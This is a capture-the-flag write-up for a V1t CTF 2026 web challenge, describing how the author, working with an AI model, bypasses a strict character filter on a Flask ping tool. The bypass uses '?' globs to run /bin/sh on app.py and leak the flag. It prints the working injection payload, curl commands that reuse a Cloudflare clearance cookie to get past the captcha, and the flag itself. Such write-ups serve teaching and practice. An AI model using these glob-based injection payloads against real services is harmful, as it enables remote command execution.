---
title: "Duck Nettool Revenge"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: web
difficulty: hard
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, web, ai-assisted]
draft: false
summary: "A ping tool with command injection behind a brutal character-set filter — RCE using only ;, ?, /, i, digits, and space to glob /bin/sh and leak app.py's source."
icon: "🦆"
---

## Summary
A Flask "NetTool" runs `ping -c 1 <target>` with `shell=True`, so it's command injection — but a regex restricts `target` to `i`, digits, `.`, `;`, `?`, `/`, and space, and forbids `" ."`/`". "`. The solve names binaries and files entirely with `?` globs and feeds the readable `app.py` to `/bin/sh`, whose "command not found" error prints the docstring containing the flag.

## Solution
The moment I saw a ping form, I called it as command injection and told the model to confirm the shell path and then map the filter — I wanted the exact alphabet I had to work with before touching payloads. It came back with the key facts: `;`, `?` (single-char glob), `/`, `.`, digits, and `i` survive, but no letters besides `i`, so I couldn't type `cat`, `sh`, or `python` at all.

I steered next on reachability rather than blind exec. I had the model read the `Dockerfile` and source together, and it caught what mattered: `flag.txt` is `chmod 0000` (unreadable by the `ctf` user), `flag.py` is a troll, and `app.py` is `ctf`-readable with `v1t{fake_flag}` sitting in its docstring — and the remote swaps that placeholder for the real flag. So the goal wasn't reading `flag.txt`; it was dumping `app.py`'s own source.

The model's first instinct was to source the file with `. app.py`, which I rejected because the filter blocks dot-space by design. I redirected it to spawn a fresh shell with `app.py` as an argument instead. It then did the grinding: globbing inside the container to find `/?i?/??` uniquely resolving to `/bin/sh` (the `i` is what separates `/bin` from `/lib`), and `???.??` matching `app.py` in the CWD. The clincher it surfaced — and I verified locally — is that `dash` chokes on the Python `"""docstring"""`, treating the whole block as one command name and echoing it verbatim in the "not found" error, flag and all.

```bash
# Local build + run (verify the leak), then the same payload goes to the remote.
docker build -t duckrev .
docker run -d --name t --read-only --tmpfs /tmp --tmpfs /run \
  --cap-drop ALL --cap-add NET_RAW -p 5001:5000 duckrev

# Payload: ;/?i?/?? ???.??  ->  ping -c 1 ; /bin/sh app.py
# Only uses ; / ? i space . and contains no " ." or ". "
curl -s -X POST --data-urlencode 'target=;/?i?/?? ???.??' http://127.0.0.1:5001/

# Remote is behind a Cloudflare captcha — submit in a browser, or reuse a
# cf_clearance cookie + matching UA:
curl -X POST 'https://api.v1t.site/' \
  -H 'Cookie: cf_clearance=<TOKEN>' -H 'User-Agent: <UA>' \
  --data-urlencode 'target=;/?i?/?? ???.??'
# URL-encoded payload: %3B/%3Fi%3F/%3F%3F%20%3F%3F%3F.%3F%3F
```

The `<pre>` response includes the line `... The SHA-256 hash of v1t{...} is not realistically brute-forceable ...` — locally that's `v1t{fake_flag}`; on the remote it's the real flag.

## Flag
```
v1t{br0_th15_15_duck}
```
